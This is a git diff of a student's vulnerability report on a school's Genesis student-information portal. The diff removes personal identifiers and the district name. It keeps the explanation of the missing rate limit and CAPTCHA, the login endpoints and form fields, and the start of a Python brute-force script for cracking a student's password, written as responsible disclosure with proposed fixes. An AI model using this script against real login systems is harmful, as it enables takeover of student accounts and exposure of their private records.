@@ -58,7 +58,7 @@ I think that at a certain grade (I would say 6th grade) students could learn how
 
 Another way to fix this problem is by making some modifications to the Genesis login system. This is something that would require working with the Genesis 'team' to fix but would be *ok* if option 1 is not viable.
 
-Currently, Genesis has no rate limit or CAPTCHA. This means that many automated password attempts can be made within very quick succession. For example, the program mentioned above was able to make over 30 requests per second. This allows simple brute force attacks (such as this one) to work. Nowadays fixing this is extremely easy with the use of external services like reCAPTCHA. 
+Currently, Genesis has no rate limit or CAPTCHA. This means that many automated password attempts can be made within very quick succession. For example, the program mentioned above was able to make over 30 requests per second. This allows simple brute force attacks (such as this one) to work. Nowadays fixing this is extremely easy with the use of external services like reCAPTCHA.
 
 ### 🌠 Fixes Conclusion
 
@@ -70,25 +70,23 @@ Personal information has become an incredibly valuable asset for advertisers, ha
 
 By reading this our district is one step closer to better security! As I hope you can see from reading this, I really care about security and want to improve the school's technology for not only myself but all other students. I will also be happy to discuss my thoughts and findings in more detail if It would be helpful.
 
-Sincerely, Connor Slade
-
-connorslade@bernardsboe.com
+Sincerely, Connor
 
 ## 📅 Technical Details (If you are interested)
 
 Here I will be going over some specific technical details of this vulnerability. View the advanced version's [code](https://github.com/Basicprogrammer10/SchoolPasswordCrack/blob/master/src/SchoolPasswordCrack.py) and see it in action [here](https://asciinema.org/a/408164). This vulnerability can be exploited manually if you have a lot of time but can be sped up immensely with a bit of code.
 
-At its most basic my script just sends a GET request to `https://parents.genesisedu.com/bernardsboe/sis/view` to get the `JSESSIONID` cookie assigned by the server. Then it sends POST requests to `https://parents.genesisedu.com/bernardsboe/sis/j_security_check` with the form data `{"j_password": <PASSWORD>, "j_username": <EMAIL>}` where `<PASSWORD>` is the password to try (ex: 307652 or 300936) and `<EMAIL>` is the email of the account to crack (ex: connorslade@bernardsboe.com). I found these details by looking at the site's network traffic when logging into my account.
+At its most basic my script just sends a GET request to `https://parents.genesisedu.com/SCHOOL_PAGE/sis/view` to get the `JSESSIONID` cookie assigned by the server. Then it sends POST requests to `https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check` with the form data `{"j_password": <PASSWORD>, "j_username": <EMAIL>}` where `<PASSWORD>` is the password to try (ex: 307652 or 300936) and `<EMAIL>` is the email of the account to crack. I found these details by looking at the site's network traffic when logging into my account.
 
 Below you can see a basic python script that will (slowly) crack a password for the supplied email account. Code comments are included to help show what each line does.
 
 ```python
 import requests  # Import needed module
 
-url      = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'  # Define api uri
-checkUrl = 'https://parents.genesisedu.com/bernardsboe/sis/view?gohome=true'  # Define defult url
+url      = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check'  # Define api uri
+checkUrl = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/view?gohome=true'  # Define defult url
 
-# Put student Email here (ex: example@bernardsboe.com)
+# Put student Email here (ex: example@domain.com)
 email = ''
 
 assert email != '' # Dont run if email is empty
